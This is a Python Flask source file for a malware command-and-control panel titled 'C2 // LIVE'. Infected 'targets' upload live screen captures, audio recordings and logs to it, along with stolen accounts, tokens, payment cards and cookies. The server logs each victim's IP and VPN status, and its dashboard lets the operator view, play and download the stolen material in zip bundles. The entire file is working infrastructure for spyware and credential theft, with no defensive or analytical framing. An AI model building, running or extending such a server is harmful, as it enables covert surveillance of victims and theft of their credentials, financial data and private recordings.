import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template_string, Response, send_file
from werkzeug.utils import secure_filename
from io import BytesIO
import zipfile

app = Flask(__name__)
UPLOAD_ROOT = "uploads"
os.makedirs(UPLOAD_ROOT, exist_ok=True)
INDEX_FILE = os.path.join(UPLOAD_ROOT, "index.json")
MUTED = set()

def load_index():
    if os.path.exists(INDEX_FILE):
        try:
            with open(INDEX_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"targets": {}}

def save_index(data):
    with open(INDEX_FILE, "w") as f:
        json.dump(data, f, indent=2)

DASHBOARD = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 // LIVE</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@500;700&display=swap');
  *{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:'Share Tech Mono',monospace;
    background:#000;color:#ff2a2a;min-height:100vh;
    background-image:linear-gradient(rgba(255,0,0,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,0,0,0.03) 1px,transparent 1px);
    background-size:40px 40px;
  }
  header{background:#0a0000;border-bottom:1px solid #ff0000;padding:14px 22px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 0 20px rgba(255,0,0,0.25)}
  header h1{font-family:'Orbitron',sans-serif;font-size:1.35rem;color:#ff0000;text-shadow:0 0 10px #ff0000,0 0 20px #ff0000;letter-spacing:3px}
  .status{font-size:.75rem;color:#ff4444;opacity:.7}
  .container{max-width:1280px;margin:0 auto;padding:22px}
  .empty{text-align:center;padding:80px;color:#660000;font-size:1.1rem}
  .card{background:#0a0000;border:1px solid #ff0000;border-radius:2px;margin-bottom:22px;box-shadow:0 0 15px rgba(255,0,0,0.15),inset 0 0 30px rgba(255,0,0,0.03);overflow:hidden}
  .card-h{background:#120000;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #ff0000}
  .card-h h2{font-family:'Orbitron',sans-serif;font-size:.95rem;color:#ff2222;text-shadow:0 0 8px #ff0000;letter-spacing:1px}
  .badge{background:#ff0000;color:#000;font-size:.65rem;font-weight:700;padding:3px 10px;letter-spacing:1px;box-shadow:0 0 10px #ff0000}
  .meta{padding:10px 16px;font-size:.75rem;color:#cc2222;border-bottom:1px solid #330000;background:#080000}
  .meta span{margin-right:16px}
  .section{padding:14px 16px;border-bottom:1px solid #220000}
  .section:last-child{border-bottom:none}
  .section h3{font-family:'Orbitron',sans-serif;font-size:.8rem;margin-bottom:10px;color:#ff3333;letter-spacing:2px;text-shadow:0 0 6px #ff0000}
  .live-screen{border:1px solid #ff0000;max-width:520px;box-shadow:0 0 12px rgba(255,0,0,0.3)}
  .live-screen img{width:100%;display:block}
  .ctrl{display:flex;gap:10px;align-items:center;margin-top:10px;flex-wrap:wrap}
  .btn{background:#000;border:1px solid #ff0000;color:#ff2222;padding:7px 14px;font-family:'Share Tech Mono',monospace;font-size:.75rem;cursor:pointer;letter-spacing:1px}
  .btn:hover{background:#ff0000;color:#000;box-shadow:0 0 12px #ff0000}
  audio{width:240px;height:28px}
  .acc{background:#000;border:1px solid #ff0000;padding:12px;font-size:.72rem;white-space:pre-wrap;word-break:break-all;max-height:340px;overflow-y:auto;color:#ff4444;box-shadow:inset 0 0 20px rgba(255,0,0,0.08)}
  .shot-grid{display:flex;flex-wrap:wrap;gap:8px}
  .shot-grid img{width:130px;height:85px;object-fit:cover;border:1px solid #ff0000}
  a{color:#ff3333;text-decoration:none}
  a:hover{color:#ff0000;text-shadow:0 0 6px #ff0000}
  .dl-btn{display:inline-block;margin-top:8px;background:#000;border:1px solid #ff0000;color:#ff2222;padding:6px 12px;font-size:.7rem;letter-spacing:1px}
  .dl-btn:hover{background:#ff0000;color:#000;box-shadow:0 0 10px #ff0000}
</style>
</head>
<body>
<header>
  <h1>C2 // LIVE</h1>
  <div class="status">SYNC {{ now }} · AUTO 8s</div>
</header>
<div class="container">
{% if not targets %}
  <div class="empty">// NO TARGETS · AWAITING SIGNAL</div>
{% else %}
  {% for tid, data in targets.items() %}
  <div class="card">
    <div class="card-h">
      <h2>{{ tid }}</h2>
      <span class="badge">LIVE</span>
    </div>
    <div class="meta">
      <span>IP {{ data.get('ip','?') }}</span>
      <span>FIRST {{ data.get('first_seen','?') }}</span>
      <span>LAST {{ data.get('last_seen','?') }}</span>
      <span>VPN {{ data.get('vpn','?') }}</span>
    </div>
    <div class="section">
      <h3>// LIVE FEED</h3>
      <div class="live-screen">
        <img id="live-{{ tid }}" src="/file/{{ tid }}/screenshots/live.jpg?t={{ now }}" onerror="this.style.opacity=0.2">
      </div>
    </div>
    <div class="section">
      <h3>// AUDIO</h3>
      <div class="ctrl">
        <audio id="aud-{{ tid }}" controls {% if tid in muted %}muted{% endif %}
          src="/file/{{ tid }}/audio/{{ (data.get('audio') or [''])[-1] }}"></audio>
        <button class="btn" onclick="toggleMute('{{ tid }}')">MUTE / UNMUTE</button>
      </div>
    </div>
    {% if data.get('accounts') %}
    <div class="section">
      <h3>// ACCOUNTS · TOKENS · CARDS · COOKIES</h3>
      <div class="acc">{{ data.accounts }}</div>
      <a class="dl-btn" href="/download/{{ tid }}/accounts">DOWNLOAD LOG</a>
    </div>
    {% endif %}
    <div class="section">
      <h3>// SCREENSHOTS ({{ data.get('screenshots',[])|length }})</h3>
      <div class="shot-grid">
        {% for s in (data.get('screenshots') or [])[-10:] %}
          {% if s != 'live.jpg' %}
          <a href="/file/{{ tid }}/screenshots/{{ s }}" target="_blank"><img src="/file/{{ tid }}/screenshots/{{ s }}" loading="lazy"></a>
          {% endif %}
        {% endfor %}
      </div>
      <a class="dl-btn" href="/download/{{ tid }}/screenshots">DOWNLOAD ALL SHOTS</a>
    </div>
    <div class="section">
      <h3>// AUDIO CLIPS ({{ data.get('audio',[])|length }})</h3>
      {% for a in (data.get('audio') or [])[-5:] %}
      <div style="margin:4px 0">
        <audio controls src="/file/{{ tid }}/audio/{{ a }}"></audio>
        <a href="/file/{{ tid }}/audio/{{ a }}">DL</a>
      </div>
      {% endfor %}
    </div>
    <div class="section">
      <h3>// DEBUG LOG</h3>
      <a class="dl-btn" href="/file/{{ tid }}/logs/debug.txt" target="_blank">OPEN DEBUG.TXT</a>
      <a class="dl-btn" href="/download/{{ tid }}/logs" style="margin-left:8px">DOWNLOAD LOGS ZIP</a>
    </div>
  </div>
  {% endfor %}
{% endif %}
</div>
<script>
function toggleMute(tid){fetch('/mute/'+tid,{method:'POST'}).then(()=>location.reload())}
setInterval(()=>{document.querySelectorAll('[id^=live-]').forEach(img=>{img.src=img.src.split('?')[0]+'?t='+Date.now()})},3500);
setTimeout(()=>location.reload(),10000);
</script>
</body>
</html>
"""

@app.route("/")
def home():
    idx = load_index()
    for tid, t in idx.get("targets", {}).items():
        acc = t.get("accounts") or ""
        t["vpn"] = "YES" if "VPN: True" in acc else ("no" if "VPN: False" in acc else "?")
    return render_template_string(DASHBOARD, targets=idx.get("targets", {}), now=datetime.now().strftime("%H:%M:%S"), muted=MUTED)

@app.route("/mute/<target_id>", methods=["POST"])
def mute(target_id):
    if target_id in MUTED:
        MUTED.discard(target_id)
    else:
        MUTED.add(target_id)
    return jsonify({"muted": target_id in MUTED})

@app.route("/download/<target_id>/<file_type>")
def download_bundle(target_id, file_type):
    tid = secure_filename(target_id)
    ftype = secure_filename(file_type)
    if ftype == "accounts":
        path = os.path.join(UPLOAD_ROOT, tid, "accounts", "accounts.txt")
        if os.path.exists(path):
            return send_from_directory(os.path.dirname(path), "accounts.txt", as_attachment=True)
        idx = load_index()
        t = idx["targets"].get(target_id, {})
        return Response(t.get("accounts", "no data"), mimetype="text/plain",
                        headers={"Content-Disposition": f"attachment;filename={tid}_accounts.txt"})
    folder = os.path.join(UPLOAD_ROOT, tid, ftype)
    if not os.path.isdir(folder):
        return "no files", 404
    mem = BytesIO()
    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as z:
        for fn in os.listdir(folder):
            z.write(os.path.join(folder, fn), fn)
    mem.seek(0)
    return send_file(mem, mimetype="application/zip", as_attachment=True, download_name=f"{tid}_{ftype}.zip")

@app.route("/upload", methods=["POST"])
def upload():
    target_id = request.form.get("target_id", "unknown")
    file_type = request.form.get("file_type", "misc")
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400
    target_dir = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    os.makedirs(target_dir, exist_ok=True)
    filename = secure_filename(f.filename)
    path = os.path.join(target_dir, filename)
    f.save(path)
    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()), "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    if file_type == "screenshots" and filename not in t["screenshots"]:
        t["screenshots"].append(filename)
    elif file_type == "audio" and filename not in t["audio"]:
        t["audio"].append(filename)
    elif file_type == "logs" and filename not in t["logs"]:
        t["logs"].append(filename)
    elif file_type == "accounts":
        try:
            with open(path, "r", errors="ignore") as fh:
                t["accounts"] = fh.read()[-9000:]
        except Exception:
            pass
    save_index(idx)
    return jsonify({"status": "ok"})

@app.route("/file/<target_id>/<file_type>/<filename>")
def serve_file(target_id, file_type, filename):
    directory = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    return send_from_directory(directory, secure_filename(filename))

@app.route("/ping", methods=["POST"])
def ping():
    target_id = request.form.get("target_id", "unknown")
    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()), "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    save_index(idx)
    return jsonify({"status": "pong"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
